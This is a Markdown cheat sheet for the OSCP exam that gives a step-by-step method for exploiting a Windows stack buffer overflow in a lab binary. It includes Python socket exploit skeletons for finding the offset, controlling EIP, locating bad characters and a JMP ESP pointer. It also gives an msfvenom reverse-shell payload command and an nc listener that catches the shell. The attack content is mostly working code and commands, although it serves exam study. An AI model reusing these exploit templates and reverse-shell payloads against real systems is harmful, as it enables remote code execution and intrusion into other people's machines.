# OSCP Windows Buffer Overflow Methodology Cheat Sheet
Created by mr-b4rt0wsk1 on 12/28/2020

## Background

The TryHackMe Buffer Overflow Prep room was used to develop this method and write this cheat sheet. The method described below does not follow the exact method taught in the THM room.  It's a combination of a few methods I've learned over the course of studying for the exam, and I've taken what I've liked from each of them to make my own.

## Assumptions

* Attacker has access to a test Windows target host with Immunity Debugger installed and the vulnerable binary downloaded (Windows 7 Professional was used for this cheat sheet)
* Attacker is using a Linux/Unix host as the attacking machine (Kali Linux was used for this cheat sheet)

## Methodology

### Step 1: Interact with the service

1. Load the binary into Immunity and run it
    1. File > Open > Browse for the vulnerable file
    2. Click 'Run'
2. Use nc from your attacker machine to interact with the program and explore its commands `nc 10.10.10.10 1337`
3. See if you can get the program to crash by providing a large amount of `'A'`'s as the input to a buffer
    1. Use this python command to print any buffer length `python3 -c 'print("A" * 1280)'`.  It is recommended to work in numbers divisible by 4
    2. Make sure to use a long enough buffer so that we have room to work with later in our exploit
    3. Click 'Restart' and then 'Run' in Immunity to reset the program for crashes or any other reason
4. Once you are satisfied with the buffer length and it is crashing the program, proceed to create the exploit
5. **Screenshot!**
- Things to capture:
    1. nc command and interaction
    2. python3 command
    3. nc command again with python3 A's
    4. The crash in Immunity

### Step 2: Create the skeleton code and replicate the crash

1. Edit the IP address, port number, prefix, and the number of `'A'`'s
2. Execute the script to send the buffer
3. Validate that the program crashed by viewing it in Immunity
4. Create a working folder in mona for the work we will do in later steps `!mona config -set workingfolder c:\mona\%p`
5. If you get switched over to the Log view, click 'View > CPU' to go back to the previous view
6. **Screenshot!**
- Things to capture:
    1. Mona workingfolder command
    2. Exploit command
    3. The crash in Immunity

Step 2 skeleton code:

```python
#!/usr/bin/python3
import socket

RHOST = "10.10.10.10"
RPORT = 1337

prefix = b"PREFIX "

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

buf = b""
buf += prefix
buf += b"A" * 1280
buf += b"\n"

try:
    s.connect((RHOST, RPORT))
    print("Sending evil buffer...")
    s.send(buf)
except:
    print("Could not connect.")
```

### Step 3: Find the offset

1. Generate the pattern using `msf-pattern_create -l 1280`.  Match the length with the number used for the number of `'A'`'s in previous steps
2. Replace the `'A'`'s portion of the code with the pattern the command generates
3. Execute the script to crash the program.  Check for the pattern using mona `!mona findmsp -distance 1280`
4. You should see a line like this `EIP contains normal pattern : 0x35694234 (offset 1034)`.  Take note of the offset number
5. Alternatively, you can use the CPU view to get the value in the EIP register (in our example it is `35694234`).  Then find the offset with this command `msf-pattern_offset -q 35694234`
6. **Screenshot!**
- Things to capture:
    1. msf-pattern_create command
    2. Exploit command
    3. Immunity crash
    4. Mona command

Step 3 skeleton code:

```python
#!/usr/bin/python3
import socket

RHOST = "10.10.10.10"
RPORT = 1337

prefix = b"PREFIX "

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

buf = b""
buf += prefix
# replace the pattern below with the pattern you create
buf += b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B"
buf += b"\n"

try:
    s.connect((RHOST, RPORT))
    print("Sending evil buffer...")
    s.send(buf)
except:
    print("Could not connect.")
```

### Step 4: Confirm control of EIP

1. Edit the code to use the offset value to write `'BBBB'` to the EIP register
2. The `buf_totlen` variable should be the same length we have been using with the `'A'`'s and offset
3. The `offset` variable will be the value obtained from the previous step
4. Execute the script and verify in Immunity that the EIP register reads `42424242`
5. **Screenshot!**
- Things to capture:
    1. Exploit command
    2. Immunity crash

Step 4 skeleton code:

```python
#!/usr/bin/python3
import socket

RHOST = "10.10.10.10"
RPORT = 1337

prefix = b"PREFIX "
buf_totlen = 1280
offset = 1034

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

buf = b""
buf += prefix
buf += b"A" * offset
buf += b"BBBB"
buf += b"CCCC"
buf += b"D" * (buf_totlen - len(buf))
buf += b"\n"

try:
    s.connect((RHOST, RPORT))
    print("Sending evil buffer...")
    s.send(buf)
except:
    print("Could not connect.")
```

### Step 5: Find bad characters

1. Run this command in mona to create a byte array since we already know the null byte will be a bad character `!mona bytearray -b "\x00"`.  It should appear in the working directory as `bytearray.bin`
2. Use the `python3 -c 'for x in range(1, 256): print("\\x" + "{:02x}".format(x), end="");` script to output a list of bytes to the terminal.  Alternatively, you can use `badchars.py` if you'd rather save and run a script
3. Copy this list and replace the `b"CCCC"` in the previous exploit script with this list
4. Send the exploit and crash the program.  View the crash in Immunity and take note of the address is in the `ESP` register (ex: `0191FA30`)
5. Run this mona command to search for bad characters.  Use the address you got from the previous step `!mona compare -f C:\mona\oscp\bytearray.bin -a 0191FA30`
6. A window with the comparison results should appear.  Make note of the bad characters.  Note that bad characters can also cause the next byte in the array to show up as a bad character even though it might not be.  (ex: if `00 08 09 2c 2d ad ae` show up as bad characters, test with these next `00 08 2c ad`)
7. Remove the bad characters from the list of bytes in the exploit script.  Update the bytearray in mona (ex: `!mona bytearray -b "\x00\x08\x2c\xad"`).  Repeat the steps 1-7 above until no more bad characters are found.  The window with the mona comparison results will display the Status as 'Unmodified' once there are no more to be found.
8. **Screenshot!**
- Things to capture:
    1. Mona bytearray
    2. Exploit command
    3. Immunity crash
    4. Mona compare
    5. Mona bytearray
    6. Exploit command
    7. Immunity crash
    8. Mona compare

Step 5 bad chars script:

```python
#!/usr/bin/python3

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')
print("\n")
```

Step 5 skeleton code:

```python
#!/usr/bin/python3
import socket

RHOST = "10.10.10.10"
RPORT = 1337

prefix = b"PREFIX "
buf_totlen = 1280
offset = 1034

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

buf = b""
buf += prefix
buf += b"A" * offset
buf += b"BBBB"
# replace the bytelist below and remove bytes from this list as you discover that they are bad characters
buf += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
buf += b"D" * (buf_totlen - len(buf))
buf += b"\n"

try:
    s.connect((RHOST, RPORT))
    print("Sending evil buffer...")
    s.send(buf)
except:
    print("Could not connect.")
```

### Step 6: Find a jump point

1. Find a pointer for `JMP ESP` by issuing this command to mona.  Make sure you replace the bad bytes with the ones you found from previous steps.  If it jumps you over to the CPU view, navigate back over to the log view `!mona jmp -r esp -cpb "\x00\x08\x2c\xad"`
2. It should output a list of addresses under the Results and finish with a statement such as `Found a total of 9 pointers`.  The number will vary depending on the program you are working on.  In my example, I will be taking the first address (ex: `0x625011af`)
3. Update the `jmp_esp_ptr` variable with the address found in the previous step.  It will be put into little endian using in the exploit example below.
4. Generate a reverse shell payload using the following command.  Make sure to replace the values in `LHOST` and `LPORT` to match your IP and the port you will be using.  Also, update the bad characters to the ones found in previous steps `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.0 LPORT=4444 EXITFUNC=thread -b "\x00\x08\x2c\xad" -f py --var-name=rev_shell`
5. You will also notice a variable called `sub_esp_10`.  This is the byte code for the operation `sub esp, 10`.  Do not modify it.  It is there because of the encoding used during the `msfvenom` command in the previous step, which messes with GetPC
6. **Screenshot!**
- Things to capture:
    1. Mona jmp
    2. msfvenom command
    3. Exploit command

Step 6 skeleton code:

```python
#!/usr/bin/python3
import socket
import struct

RHOST = "10.10.10.10"
RPORT = 1337

prefix = b"PREFIX "
buf_totlen = 1280
offset = 1034
# replace the pointer below with the JMP ESP pointer you found from the steps above
jmp_esp_ptr = 0x625011af
sub_esp_10 = b"\x83\xec\x10"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.0 LPORT=4444 EXITFUNC=thread -b "\x00\x08\x2c\xad" -f py --var-name=rev_shell
# insert the msfvenom generated shellcode in the buf below
# rev_shell =  b""
# rev_shell += b"\xdb\xdf\xbe\x51\x18\xb9\xc7\xd9\x74\x24\xf4"
# ...
# rev_shell += b"\xb7\x0e\x9b\x01\x34\xba\x64\xf6\x24\xcf\x61"
# rev_shell += b"\xb2\xe2\x3c\x18\xab\x86\x42\x8f\xcc\x82"

buf = b""
buf += prefix
buf += b"A" * offset
buf += struct.pack('<I', jmp_esp_ptr)
buf += sub_esp_10
buf += rev_shell
buf += b"D" * (buf_totlen - len(buf))
buf += b"\n"

try:
    s.connect((RHOST, RPORT))
    print("Sending evil buffer...")
    s.send(buf)
except:
    print("Could not connect.")
```

### Step 7: Exploit

1. Set up a listener on your attacker machine using `nc`.  In my example, my command will look like this `nc -lvnp 4444`.  Update the port number depending on what port you use.  You may have to run as `sudo` for lower ports
2. Make sure the program is running in Immunity, and then send the exploit
3. Check your listener for your shell.  Exploit complete!
4. **Screenshot!**
- Things to capture:
    1. nc reverse shell
    2. proof.txt

## Resources
* dostackbufferoverflowgood [PDF](https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood_tutorial.pdf)
* dostackbufferoverflowgood [repo](https://github.com/justinsteven/dostackbufferoverflowgood)
* Online x86 / x64 Assembler and Disassembler [link](https://defuse.ca/online-x86-assembler.htm)
* TryHackMe Buffer Overflow Prep Room [link](https://tryhackme.com/room/bufferoverflowprep)